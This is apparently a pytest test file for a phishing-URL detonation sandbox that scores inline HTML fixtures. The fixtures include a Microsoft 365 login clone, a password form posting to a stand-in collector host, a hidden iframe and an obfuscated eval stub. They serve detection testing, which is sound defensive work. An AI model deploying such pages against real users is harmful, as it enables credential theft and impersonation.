"""Automated unit and integration tests for dynamic URL detonation and DOM analysis."""

import pytest
from phishguard.sandbox import (
    DetonationVerdict,
    FormTarget,
    UrlDetonator,
    UrlDetonationResult,
)


def test_detonate_clean_landing_page():
    """Verify clean static web page without forms or brand spoofing is classified as BENIGN."""
    clean_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Welcome to Tech Blog</title></head>
      <body>
        <h1>Articles & Tutorials</h1>
        <p>Learn open-source Python development and cyber defense practices.</p>
      </body>
    </html>
    """
    detonator = UrlDetonator()
    result = detonator.detonate(
        target_url="https://techblog.example.org/home",
        html_override=clean_html,
        status_override=200,
    )

    assert isinstance(result, UrlDetonationResult)
    assert result.verdict == DetonationVerdict.BENIGN
    assert result.risk_score < 25.0
    assert result.page_title == "Welcome to Tech Blog"
    assert result.has_credential_harvesting_form is False
    assert result.brand_impersonation.detected is False


def test_detonate_credential_harvesting_form():
    """Verify detection of interactive password input fields in landing DOM."""
    login_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Account Verification</title></head>
      <body>
        <h2>Confirm Your Credentials</h2>
        <form action="/auth/verify.php" method="POST">
          <input type="text" name="email" placeholder="Email Address">
          <input type="password" name="passwd" placeholder="Password">
          <button type="submit">Verify Now</button>
        </form>
      </body>
    </html>
    """
    detonator = UrlDetonator()
    result = detonator.detonate(
        target_url="http://auth-portal.com/verify",
        html_override=login_html,
        status_override=200,
    )

    assert result.has_credential_harvesting_form is True
    assert len(result.forms_detected) == 1
    form: FormTarget = result.forms_detected[0]
    assert form.has_password_field is True
    assert form.has_email_field is True
    assert result.verdict in (DetonationVerdict.SUSPICIOUS, DetonationVerdict.MALICIOUS)
    assert result.risk_score >= 45.0


def test_detonate_external_credential_post():
    """Verify detection when form submits harvested credentials to a third-party host."""
    exfil_html = """
    <html>
      <head><title>Login Required</title></head>
      <body>
        <form action="http://exfil-collector.ru/drop.php" method="POST">
          <input type="password" name="user_password">
          <input type="submit" value="Sign In">
        </form>
      </body>
    </html>
    """
    detonator = UrlDetonator()
    result = detonator.detonate(
        target_url="http://legit-looking-landing.org/welcome",
        html_override=exfil_html,
        status_override=200,
    )

    assert result.has_credential_harvesting_form is True
    assert len(result.forms_detected) == 1
    form = result.forms_detected[0]
    assert form.is_external_post is True
    assert any("external host" in ind for ind in result.suspicious_indicators)
    assert result.risk_score >= 60.0
    assert result.verdict == DetonationVerdict.MALICIOUS


def test_detonate_brand_impersonation_microsoft():
    """Verify detection of unauthorized Microsoft login brand clone on non-Microsoft domain."""
    msft_phish_html = """
    <!DOCTYPE html>
    <html>
      <head><title>Sign in to your account - Microsoft Online</title></head>
      <body>
        <div class="banner">Microsoft Corporation</div>
        <h2>Sign in to access your Microsoft 365 services</h2>
        <form action="/login.php" method="POST">
          <input type="email" name="loginfmt" placeholder="someone@example.com">
          <input type="password" name="passwd" placeholder="Password">
          <input type="checkbox" name="kmsi"> Keep me signed in
          <button type="submit">Next</button>
        </form>
      </body>
    </html>
    """
    detonator = UrlDetonator()
    result = detonator.detonate(
        target_url="http://185.220.101.5/office365-auth/login.html",
        html_override=msft_phish_html,
        status_override=200,
    )

    assert result.brand_impersonation.detected is True
    assert result.brand_impersonation.impersonated_brand == "Microsoft"
    assert result.brand_impersonation.confidence >= 0.8
    assert result.has_credential_harvesting_form is True
    assert result.verdict == DetonationVerdict.MALICIOUS
    assert result.risk_score >= 75.0
    assert any("Direct IP address host" in ind for ind in result.suspicious_indicators)


def test_detonate_meta_refresh_redirect():
    """Verify identification of client-side HTML meta refresh redirects."""
    meta_html = """
    <html>
      <head>
        <meta http-equiv="refresh" content="0; url=https://final-destination.com/pay">
        <title>Redirecting...</title>
      </head>
      <body>Please wait while we redirect you.</body>
    </html>
    """
    detonator = UrlDetonator()
    result = detonator.detonate(
        target_url="http://intermediate-hop.net/track",
        html_override=meta_html,
        status_override=200,
    )

    assert result.final_url == "https://final-destination.com/pay"
    assert any("meta-refresh redirect" in ind for ind in result.suspicious_indicators)
    assert result.total_redirects >= 1


def test_detonate_obfuscated_script_and_hidden_iframe():
    """Verify detection of dynamic JS decoders and stealth iframe elements."""
    evasive_html = """
    <html>
      <head><title>Portal Loading</title></head>
      <body>
        <iframe src="http://hidden-payload.xyz" width="0" height="0" style="display:none;"></iframe>
        <script>
          var decoded = eval(String.fromCharCode(97, 108, 101, 114, 116));
        </script>
      </body>
    </html>
    """
    detonator = UrlDetonator()
    result = detonator.detonate(
        target_url="http://dropper.online/index.html",
        html_override=evasive_html,
        status_override=200,
    )

    assert any("Stealth concealed iframe" in ind for ind in result.suspicious_indicators)
    assert any("obfuscation detected" in ind for ind in result.suspicious_indicators)
    assert result.risk_score >= 40.0
